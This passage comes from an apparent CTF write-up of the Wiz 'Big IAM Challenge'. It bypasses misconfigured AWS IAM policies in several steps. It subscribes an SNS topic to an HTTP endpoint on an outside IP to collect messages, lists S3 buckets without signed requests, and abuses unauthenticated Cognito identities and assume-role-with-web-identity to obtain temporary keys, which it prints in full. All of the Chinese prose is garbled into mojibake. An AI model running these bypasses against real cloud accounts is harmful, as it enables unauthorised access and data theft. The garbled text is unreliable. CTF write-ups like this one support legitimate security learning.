é€’ã€‚è¿™äº›åº”ç”¨ç¨‹åºåŒ…æ‹¬ Amazon Simple Queue Service (SQS)ã€Amazon Kinesis Data Firehoseã€AWS Lambda å’Œå…¶ä»– HTTPS ç«¯ç‚¹ã€‚A2P åŠŸèƒ½å…è®¸æ‚¨å¯ä»¥é€šè¿‡ SMS æ–‡æœ¬ã€æ¨é€é€šçŸ¥å’Œç”µå­é‚®ä»¶å‘å®¢æˆ·å‘é€æ¶ˆæ¯ã€‚&#x20;</p></blockquote><h4 id="Policy"><a href="#Policy" class="headerlink" title="Policy"></a>Policy</h4><blockquote><p>â€œConditionâ€: å¯é€‰å­—æ®µï¼Œå®šä¹‰äº†è¿›ä¸€æ­¥çš„æ¡ä»¶ä»¥é™åˆ¶æˆæƒç”Ÿæ•ˆçš„æ¡ä»¶ã€‚â€StringLikeâ€ æ¡ä»¶æŒ‡å®šäº† â€œsns:Endpointâ€ çš„å€¼å¿…é¡»ç¬¦åˆ â€œ *@tbic.wiz.ioâ€ çš„æ¨¡å¼ã€‚è¿™æ„å‘³ç€åªæœ‰ä»¥ â€œ@tbic.wiz.ioâ€ ç»“å°¾çš„ç”µå­é‚®ä»¶åœ°å€æ‰èƒ½è®¢é˜…è¯¥ä¸»é¢˜</p></blockquote><p>ç†è®ºä¸Šæ˜¯è¿™æ ·çš„ï¼Œä½†AWS SNSè¿˜æ”¯æŒHTTP/HTTPSè®¢é˜…ï¼Œé‚£å°±å¾ˆçµæ´»äº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_9U2G-lCM35.png" alt=""></p><h4 id="ByPass-Policy"><a href="#ByPass-Policy" class="headerlink" title="ByPass Policy"></a>ByPass Policy</h4><p>å†™ä¸€ä¸ªç¬¦åˆStringLikeåŒ¹é…è§„åˆ™çš„åœ°å€å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws sns subscribe --protocol http --notification-endpoint http://43.134.44.115:7777/auray@tbic.wiz.io --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_IMRnWZG2TX.png" alt=""></p><p>ç¡®è®¤è®¢é˜…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws sns confirm-subscription --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --token 2336412f37fb687f5d51e6e2425c464dede3c082bf36407da1ade0d6721adfa5c4bab5dc579c04d6ee787d24bf37506bcb3b8b8d232a4d039bee171a36403f3177ac0e279f5e1ed5b806ac8081aa77683a43431091c73e8d8502c3c6b967777671a330aecd993a65d88fb4fffa23315d258e79e5b1d41f1237f32e29dffeda59<br><br></code></pre></td></tr></table></figure><p>è¿‡äº†ä¸€ä¼šä¹‹åï¼Œä¼šæ”¶åˆ°Messageï¼Œå…¶ä¸­åŒ…å«flag</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_P3oNL3YQnk.png" alt=""></p><h2 id="Admin-only"><a href="#Admin-only" class="headerlink" title="Admin only?"></a>Admin only?</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<br>    <span class="hljs-string">&quot;Version&quot;</span>: <span class="hljs-string">&quot;2012-10-17&quot;</span>,<br>    <span class="hljs-string">&quot;Statement&quot;</span>: [<br>        &#123;<br>            <span class="hljs-string">&quot;Effect&quot;</span>: <span class="hljs-string">&quot;Allow&quot;</span>,<br>            <span class="hljs-string">&quot;Principal&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>,<br>            <span class="hljs-string">&quot;Action&quot;</span>: <span class="hljs-string">&quot;s3:GetObject&quot;</span>,<br>            <span class="hljs-string">&quot;Resource&quot;</span>: <span class="hljs-string">&quot;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*&quot;</span><br>        &#125;,<br>        &#123;<br>            <span class="hljs-string">&quot;Effect&quot;</span>: <span class="hljs-string">&quot;Allow&quot;</span>,<br>            <span class="hljs-string">&quot;Principal&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>,<br>            <span class="hljs-string">&quot;Action&quot;</span>: <span class="hljs-string">&quot;s3:ListBucket&quot;</span>,<br>            <span class="hljs-string">&quot;Resource&quot;</span>: <span class="hljs-string">&quot;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321&quot;</span>,<br>            <span class="hljs-string">&quot;Condition&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;StringLike&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;s3:prefix&quot;</span>: <span class="hljs-string">&quot;files/*&quot;</span><br>                &#125;,<br>                <span class="hljs-string">&quot;ForAllValues:StringLike&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;aws:PrincipalArn&quot;</span>: <span class="hljs-string">&quot;arn:aws:iam::133713371337:user/admin&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç­–ç•¥å…è®¸ä»»ä½•ç”¨æˆ·è·å–æŒ‡å®š S3 å­˜å‚¨æ¡¶ä¸‹æ‰€æœ‰å¯¹è±¡çš„æƒé™ï¼Œå¹¶ä¸”åªæœ‰ä½¿ç”¨ <code>arn:aws:iam::133713371337:user/admin</code> èº«ä»½çš„ç”¨æˆ·å¯ä»¥åˆ—å‡ºä»¥ <code>files/</code> å¼€å¤´çš„å¯¹è±¡ã€‚</p><p>ä¸ºäº†æ‹¿åˆ°flagï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°å¯¹åº”çš„Keyï¼Œä½†åªæœ‰adminæ‰æœ‰ListBucketæƒé™ã€‚</p><h4 id="ByPass-Policy-1"><a href="#ByPass-Policy-1" class="headerlink" title="ByPass Policy"></a>ByPass Policy</h4><blockquote><p>å¯¹äº ForAllValuesï¼Œå¦‚æœè¯·æ±‚ä¸­æ²¡æœ‰é”®æˆ–è€…é”®å€¼è§£æä¸ºç©ºæ•°æ®é›†ï¼ˆå¦‚ç©ºå­—ç¬¦ä¸²ï¼‰ï¼Œåˆ™ä¹Ÿä¼šè¿”å› trueï¼Œä¸è¦ä½¿ç”¨å¸¦æœ‰ Allow æ•ˆæœçš„ ForAllValuesï¼Œå› ä¸ºè¿™æ ·å¯èƒ½ä¼šè¿‡äºå®½å®¹ã€‚</p></blockquote><p>è¿™é‡Œç¬¦åˆæ¡ä»¶ï¼Œé‚£æˆ‘ä»¬ç›´æ¥åˆ©ç”¨<code>--no-sign-request</code>ç»•è¿‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3api list-objects --bucket thebigiamchallenge-admin-storage-abf1321 --prefix <span class="hljs-string">&#x27;files/&#x27;</span> --no-sign-request<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_D_oHllS2qL.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/TBjtvNQ-XM.png" alt="TBjtvNQ-XM"></p><h2 id="Do-I-know-you"><a href="#Do-I-know-you" class="headerlink" title="Do I know you?"></a>Do I know you?</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<br>    <span class="hljs-string">&quot;Version&quot;</span>: <span class="hljs-string">&quot;2012-10-17&quot;</span>,<br>    <span class="hljs-string">&quot;Statement&quot;</span>: [<br>        &#123;<br>            <span class="hljs-string">&quot;Sid&quot;</span>: <span class="hljs-string">&quot;VisualEditor0&quot;</span>,<br>            <span class="hljs-string">&quot;Effect&quot;</span>: <span class="hljs-string">&quot;Allow&quot;</span>,<br>            <span class="hljs-string">&quot;Action&quot;</span>: [<br>                <span class="hljs-string">&quot;mobileanalytics:PutEvents&quot;</span>,<br>                <span class="hljs-string">&quot;cognito-sync:*&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Resource&quot;</span>: <span class="hljs-string">&quot;*&quot;</span><br>        &#125;,<br>        &#123;<br>            <span class="hljs-string">&quot;Sid&quot;</span>: <span class="hljs-string">&quot;VisualEditor1&quot;</span>,<br>            <span class="hljs-string">&quot;Effect&quot;</span>: <span class="hljs-string">&quot;Allow&quot;</span>,<br>            <span class="hljs-string">&quot;Action&quot;</span>: [<br>                <span class="hljs-string">&quot;s3:GetObject&quot;</span>,<br>                <span class="hljs-string">&quot;s3:ListBucket&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Resource&quot;</span>: [<br>                <span class="hljs-string">&quot;arn:aws:s3:::wiz-privatefiles&quot;</span>,<br>                <span class="hljs-string">&quot;arn:aws:s3:::wiz-privatefiles/*&quot;</span><br>            ]<br>        &#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Cognito"><a href="#Cognito" class="headerlink" title="Cognito"></a>Cognito</h4><blockquote><p>Amazon Cognito æ˜¯ Web å’Œç§»åŠ¨åº”ç”¨ç¨‹åºçš„èº«ä»½å¹³å°ã€‚å®ƒæ˜¯ç”¨æˆ·ç›®å½•ã€èº«ä»½éªŒè¯æœåŠ¡å™¨ä»¥åŠ OAuth 2.0 è®¿é—®ä»¤ç‰Œå’Œ AWS å‡­è¯çš„æˆæƒæœåŠ¡ã€‚ä½¿ç”¨ Amazon Cognitoï¼Œæ‚¨å¯ä»¥å¯¹å†…ç½®ç”¨æˆ·ç›®å½•ã€ä¼ä¸šç›®å½•ä»¥åŠ Google å’Œ Facebook ç­‰ä½¿ç”¨è€…èº«ä»½æä¾›è€…ä¸­çš„ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯å’Œæˆæƒã€‚</p></blockquote><p>è®©GPTå¸®å¿™æŸ¥ä¸€ä¸‹å¦‚ä½•ä½¿ç”¨</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_89dN-E5iwP.png" alt=""></p><p>ä½†æˆ‘ä»¬å¹¶æ²¡æœ‰AKSKã€‚äºæ˜¯å¼€å§‹å¯»æ‰¾ï¼Œåœ¨ç½‘ç«™å›¾ç‰‡è¿™é‡Œå¯ä»¥çœ‹åˆ°AKSKæ³„æ¼</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_nZjnacpb2L.png" alt=""></p><p>ç›´æ¥è¯»å¥½åƒä¸å¤ªè¡Œ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/2023-08-13%2022.14.48_VmqsTQV6yP.png" alt="2023-08-13 22.14.48_VmqsTQV6yP"></p><p>åæ¥çœ‹writeupï¼Œå¸ˆå‚…ä»¬å‘ç°äº†è¿™é‡Œçš„js</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_FUh3ft72Z1.png" alt=""></p><p>ä¸Šé¢åªè·å–äº†logoå›¾ï¼Œæˆ‘ä»¬éœ€è¦åˆ—å‡ºæ‰€æœ‰æ–‡ä»¶ï¼Œç›´æ¥äº¤ç»™GPTå†™ä¸€æ®µè·å–S3æ–‡ä»¶çš„ä»£ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;<span class="hljs-built_in">head</span>&gt;<br>    &lt;title&gt;Cognito JavaScript SDK Example&lt;/title&gt;<br>    &lt;script src=<span class="hljs-string">&quot;https://sdk.amazonaws.com/js/aws-sdk-2.100.0.min.js&quot;</span>&gt;&lt;/script&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;script&gt;<br>        // åˆå§‹åŒ–AWS SDKé…ç½®<br>        AWS.config.region = <span class="hljs-string">&#x27;us-east-1&#x27;</span>;<br>        AWS.config.credentials = new AWS.CognitoIdentityCredentials(&#123;<br>            IdentityPoolId: <span class="hljs-string">&#x27;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&#x27;</span>,<br>        &#125;);<br>        // è·å–ä¸´æ—¶å‡­è¯<br>        AWS.config.credentials.get(<span class="hljs-keyword">function</span>(err) &#123;<br>            <span class="hljs-keyword">if</span> (!err) &#123;<br>                // å‡­è¯è·å–æˆåŠŸ<br>                var accessKeyId = AWS.config.credentials.accessKeyId;<br>                var secretAccessKey = AWS.config.credentials.secretAccessKey;<br>                var sessionToken = AWS.config.credentials.sessionToken;<br><br>                // è¿›è¡Œåç»­æ“ä½œï¼Œå¦‚è®¿é—®S3<br>                accessS3(accessKeyId, secretAccessKey, sessionToken);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                // å‡­è¯è·å–å¤±è´¥<br>                console.error(<span class="hljs-string">&#x27;Error retrieving credentials: &#x27;</span> + err);<br>            &#125;<br>        &#125;);<br>        // ä½¿ç”¨ä¸´æ—¶å‡­è¯è®¿é—®S3<br>        <span class="hljs-keyword">function</span> accessS3(accessKeyId, secretAccessKey, sessionToken) &#123;<br>            var s3 = new AWS.S3(&#123;<br>                accessKeyId: accessKeyId,<br>                secretAccessKey: secretAccessKey,<br>                sessionToken: sessionToken,<br>            &#125;);<br>            var params = &#123;<br>                Bucket: <span class="hljs-string">&#x27;wiz-privatefiles&#x27;</span>,<br>            &#125;;<br>            s3.getSignedUrl(<span class="hljs-string">&#x27;listObjectsV2&#x27;</span>, params, <span class="hljs-keyword">function</span>(err, data) &#123;<br>                <span class="hljs-keyword">if</span> (!err) &#123;<br>                    // S3å­˜å‚¨æ¡¶åˆ—è¡¨è·å–æˆåŠŸ<br>                    console.log(data);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    // S3å­˜å‚¨æ¡¶åˆ—è¡¨è·å–å¤±è´¥<br>                    console.error(<span class="hljs-string">&#x27;Error listing S3 buckets: &#x27;</span> + err);<br>                &#125;<br>            &#125;);<br>        &#125;<br>    &lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-08-13%2022.37.32_w7eJ6AOcIB.png" alt=""></p><p>æˆåŠŸåˆ—å‡ºäº†æ‰€æœ‰æ–‡ä»¶ï¼Œä¹ŸçŸ¥é“flagåœ¨flag1.txté‡Œé¢äº†ã€‚ä½†ä¸èƒ½ç›´æ¥è¯»</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/2023-08-13%2022.38.23_qGRwckGPu7.png" alt="2023-08-13 22.38.23_qGRwckGPu7"></p><p>åªèƒ½è®©GPTå†æ”¹ä¸€ä¸‹äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;<span class="hljs-built_in">head</span>&gt;<br>    &lt;title&gt;Cognito JavaScript SDK Example&lt;/title&gt;<br>    &lt;script src=<span class="hljs-string">&quot;https://sdk.amazonaws.com/js/aws-sdk-2.100.0.min.js&quot;</span>&gt;&lt;/script&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;script&gt;<br>        // åˆå§‹åŒ–AWS SDKé…ç½®<br>        AWS.config.region = <span class="hljs-string">&#x27;us-east-1&#x27;</span>;<br>        AWS.config.credentials = new AWS.CognitoIdentityCredentials(&#123;<br>            IdentityPoolId: <span class="hljs-string">&#x27;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&#x27;</span>,<br>        &#125;);<br>        // è·å–ä¸´æ—¶å‡­è¯<br>        AWS.config.credentials.get(<span class="hljs-keyword">function</span>(err) &#123;<br>            <span class="hljs-keyword">if</span> (!err) &#123;<br>                // å‡­è¯è·å–æˆåŠŸ<br>                var accessKeyId = AWS.config.credentials.accessKeyId;<br>                var secretAccessKey = AWS.config.credentials.secretAccessKey;<br>                var sessionToken = AWS.config.credentials.sessionToken;<br><br>                // è¿›è¡Œåç»­æ“ä½œï¼Œå¦‚è®¿é—®S3<br>                accessS3(accessKeyId, secretAccessKey, sessionToken);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                // å‡­è¯è·å–å¤±è´¥<br>                console.error(<span class="hljs-string">&#x27;Error retrieving credentials: &#x27;</span> + err);<br>            &#125;<br>        &#125;);<br>        // ä½¿ç”¨ä¸´æ—¶å‡­è¯è®¿é—®S3<br>        <span class="hljs-keyword">function</span> accessS3(accessKeyId, secretAccessKey, sessionToken) &#123;<br>            var s3 = new AWS.S3(&#123;<br>                accessKeyId: accessKeyId,<br>                secretAccessKey: secretAccessKey,<br>                sessionToken: sessionToken,<br>            &#125;);<br>            var params = &#123;<br>                Bucket: <span class="hljs-string">&#x27;wiz-privatefiles&#x27;</span>,<br>                Key: <span class="hljs-string">&#x27;flag1.txt&#x27;</span>,<br>            &#125;;<br>            s3.getSignedUrl(<span class="hljs-string">&#x27;getObject&#x27;</span>, params, <span class="hljs-keyword">function</span>(err, data) &#123;<br>                <span class="hljs-keyword">if</span> (!err) &#123;<br>                    // S3å­˜å‚¨æ¡¶å¯¹è±¡è·å–æˆåŠŸ<br>                    console.log(data);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    // S3å­˜å‚¨æ¡¶å¯¹è±¡è·å–å¤±è´¥<br>                    console.error(<span class="hljs-string">&#x27;Error get S3 bucket object: &#x27;</span> + err);<br>                &#125;<br>            &#125;);<br>        &#125;<br>    &lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/2023-08-13%2022.43.14_0n8oe8k649.png" alt="2023-08-13 22.43.14_0n8oe8k649"></p><h2 id="One-final-push"><a href="#One-final-push" class="headerlink" title="One final push"></a>One final push</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<br>    <span class="hljs-string">&quot;Version&quot;</span>: <span class="hljs-string">&quot;2012-10-17&quot;</span>,<br>    <span class="hljs-string">&quot;Statement&quot;</span>: [<br>        &#123;<br>            <span class="hljs-string">&quot;Effect&quot;</span>: <span class="hljs-string">&quot;Allow&quot;</span>,<br>            <span class="hljs-string">&quot;Principal&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;Federated&quot;</span>: <span class="hljs-string">&quot;cognito-identity.amazonaws.com&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;Action&quot;</span>: <span class="hljs-string">&quot;sts:AssumeRoleWithWebIdentity&quot;</span>,<br>            <span class="hljs-string">&quot;Condition&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;StringEquals&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;cognito-identity.amazonaws.com:aud&quot;</span>: <span class="hljs-string">&quot;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸€é¢˜æ˜¯ä¸Šä¸€é¢˜çš„å»¶ä¼¸ï¼ŒåŠ äº†æ›´å¤šé™åˆ¶ã€‚</p><p>äº†è§£äº†ä¸€ä¸‹<code>sts:AssumeRoleWithWebIdentity</code></p><blockquote><p>å½“ä¸€ä¸ªç”¨æˆ·è¦ä½¿ç”¨ AWS èµ„æºæ—¶ï¼Œä»–ä»¬å¯ä»¥æä¾›ä¸€ä¸ª Web èº«ä»½éªŒè¯æä¾›è€…ï¼ˆå¦‚Googleã€Facebookç­‰ï¼‰é¢å‘çš„èº«ä»½éªŒè¯ä»¤ç‰Œã€‚é€šè¿‡ä½¿ç”¨ â€œsts:AssumeRoleWithWebIdentityâ€ æ“ä½œï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨è¿™ä¸ªä»¤ç‰Œæ¥è·å–ä¸€ä¸ªä¸´æ—¶å®‰å…¨å‡­è¯ï¼Œç„¶åå†ä½¿ç”¨è¿™äº›å‡­è¯æ¥è®¿é—® AWS èµ„æºã€‚</p></blockquote><p>ç›´æ¥å‚è€ƒGPTåˆ©ç”¨ï¼š</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_22kpONLQo8.png" alt=""></p><h4 id="è·å–web-identity-token"><a href="#è·å–web-identity-token" class="headerlink" title="è·å–web-identity-token"></a>è·å–web-identity-token</h4><p>æŒ‰ç…§GPTçš„æŒ‡ç¤ºå’Œé¢˜ç›®çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å¼€å§‹è·å–web-identity-token</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_DblgwxDMNR.png" alt=""></p><p><strong>è·å–identity ID</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; aws cognito-identity get-id \<br>    --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b<br>&#123;<br>    <span class="hljs-string">&quot;IdentityId&quot;</span>: <span class="hljs-string">&quot;us-east-1:f22b7a05-a0bf-417d-8ed8-e6de18694214&quot;</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>è·å–web-identity-token</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; aws cognito-identity get-open-id-token \<br>    --identity-id us-east-1:f22b7a05-a0bf-417d-8ed8-e6de18694214<br>&#123;<br>    <span class="hljs-string">&quot;IdentityId&quot;</span>: <span class="hljs-string">&quot;us-east-1:f22b7a05-a0bf-417d-8ed8-e6de18694214&quot;</span>,<br>    <span class="hljs-string">&quot;Token&quot;</span>: <span class="hljs-string">&quot;eyJraWQiOiJ1cy1lYXN0LTE......_MjJPYZeO0oO3Dw&quot;</span><br>&#125;<br>&gt; <br></code></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆæˆ‘ä»¬ä¸éœ€è¦åƒGPTæç¤ºçš„é‚£æ ·æ·»åŠ <code>â€”-logins</code> å‚æ•°å‘¢ï¼Ÿ</p><p>å› ä¸ºè¿™é‡Œå­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´ :)</p><p>ï¼ˆä¸ç„¶æˆ‘ä»¬ä¹Ÿæ— æ³•å®Œæˆæ”»å‡»ï¼‰</p><p>GPTç»™å‡ºçš„åˆ©ç”¨æ–¹å¼å¥½åƒä¸å¤ªè¡Œå˜›</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_KF88kZKXys.png" alt=""></p><p>åé¢çœ‹å¸ˆå‚…ä»¬çš„writeupï¼Œç”¨çš„<code>aws sts assume-role-with-web-identity</code></p><h4 id="aws-sts-assume-role-with-web-identity"><a href="#aws-sts-assume-role-with-web-identity" class="headerlink" title="aws sts assume-role-with-web-identity"></a>aws sts assume-role-with-web-identity</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name auray --web-identity-toke<br>n eyJraWQiOiJ1c......YZeO0oO3Dw<br>&#123;<br>    <span class="hljs-string">&quot;Credentials&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;AccessKeyId&quot;</span>: <span class="hljs-string">&quot;ASIARK7LBOHXFM42OLPL&quot;</span>,<br>        <span class="hljs-string">&quot;SecretAccessKey&quot;</span>: <span class="hljs-string">&quot;X9HbOd6L/1GnaZ+M/Q7PXpNXSlqT/bc7xTdQenJe&quot;</span>,<br>        <span class="hljs-string">&quot;SessionToken&quot;</span>: <span class="hljs-string">&quot;FwoGZXIvY......w7CUxtg==&quot;</span>,<br>        <span class="hljs-string">&quot;Expiration&quot;</span>: <span class="hljs-string">&quot;2023-08-13T16:20:23Z&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;SubjectFromWebIdentityToken&quot;</span>: <span class="hljs-string">&quot;us-east-1:f22b7a05-a0bf-417d-8ed8-e6de18694214&quot;</span>,<br>    <span class="hljs-string">&quot;AssumedRoleUser&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;AssumedRoleId&quot;</span>: <span class="hljs-string">&quot;AROARK7LBOHXASFTNOIZG:auray&quot;</span>,<br>        <span class="hljs-string">&quot;Arn&quot;</span>: <span class="hljs-string">&quot;arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/auray&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;Provider&quot;</span>: <span class="hljs-string">&quot;cognito-identity.amazonaws.com&quot;</span>,<br>    <span class="hljs-string">&quot;Audience&quot;</span>: <span class="hljs-string">&quot;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>æˆåŠŸè·å–åˆ°ä¸´æ—¶å‡­æ®ï¼Œæ¥ä¸‹æ¥ç›´æ¥åˆ©ç”¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; <span 